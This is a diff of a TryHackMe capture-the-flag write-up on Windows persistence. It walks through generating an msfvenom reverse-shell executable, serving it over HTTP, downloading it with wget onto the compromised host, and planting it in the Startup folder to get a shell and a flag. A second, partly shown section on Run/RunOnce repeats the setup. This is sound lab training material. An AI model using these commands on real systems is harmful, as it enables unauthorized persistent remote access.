@@ -3,11 +3,11 @@ Module link: https://tryhackme.com/room/windowslocalpersistence
 
 **Please feel free to point out any errors that you may see in this writeup!**
 
-This writeup was last updated: 07/06/2023
+This writeup was last updated: 07/08/2023
 
 # Startup Folder
 1. Started up this task's machine
-2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -17,27 +17,27 @@ Payload size: 460 bytes
 Final size of exe file: 7168 bytes
 Saved as: revshell.exe
 ```
-3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
+3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for inbound connections
 ```Bash
 root@ip-10-10-157-221:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
-4. `sudo python3 -m http.server` from our Linux attack machine
+4. `sudo python3 -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow the compromised Windows machine to connect back to our attack machine and download the reverse shell payload that we just created
 ```Bash
 root@ip-10-10-157-221:~# sudo python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-5. `PowerShell` from the compromised Windows machine
+5. `PowerShell` from the compromised Windows machine to launch PowerShell
 ```PowerShell
 C:\Users\Administrator>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 ```
-6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
+6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
 ```PowerShell
 PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
 ```
-7. `dir` from the compromised Windows machine
+7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
 ```PowerShell
 PS C:\Users\Administrator> dir
 
@@ -61,12 +61,12 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/7/2023   5:31 PM           7168 revshell.exe
 ```
-8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine
+8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move our payload into the **C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp** directory, which is a directory that contains executables that all get executed whenever a user logs in to the compromised Windows machine
 ```PowerShell
 PS C:\Users\Administrator> move revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
         1 file(s) moved.
 ```
-9. Sign out and log back in from the compromised Windows machine
+9. After successfully executing the previous commands, we signed out and logged back in from the compromised Windows machine, which ended up executing our payload that we move in to the **C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp** directory after we logged back in, which ended up creating a reverse shell that connected back to our attack machine's netcat listener
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)
 
@@ -83,7 +83,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-10. `C:\flags\flag10.exe` from our reverse shell on our attack machine to
+10. `C:\flags\flag10.exe` from our reverse shell on our attack machine to run the **flag10.exe** program onto our terminal, which ended up containing this task's flag
 ```PowerShell
 C:\Windows\system32>C:\flags\flag10.exe
 C:\flags\flag10.exe
@@ -95,7 +95,7 @@ THM{NO_NO_AFTER_YOU}
 
 # Run / RunOnce
 1. Started up this task's machine
-2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe`
+2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
 ```Bash
 root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -105,27 +105,27 @@ Payload size: 460 bytes
 Final size of exe file: 7168 bytes
 Saved as: revshell.exe
 ```
-3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
+3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for inbound connections
 ```Bash
 root@ip-10-10-157-221:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
-4. `sudo python3 -m http.server` from our Linux attack machine
+4. `sudo python3 -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow the compromised Windows machine to connect back to our attack machine and download the reverse shell payload that we just created
 ```Bash
 root@ip-10-10-157-221:~# sudo python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
-5. `PowerShell` from the compromised Windows machine
+5. `PowerShell` from the compromised Windows machine to launch PowerShell
 ```PowerShell
 C:\Users\Administrator>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 ```
-6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
+6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
 ```PowerShell
 PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
 ```
-7. `dir` from the compromised Windows machine
+7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
 ```PowerShell
 PS C:\Users\Administrator> dir
 
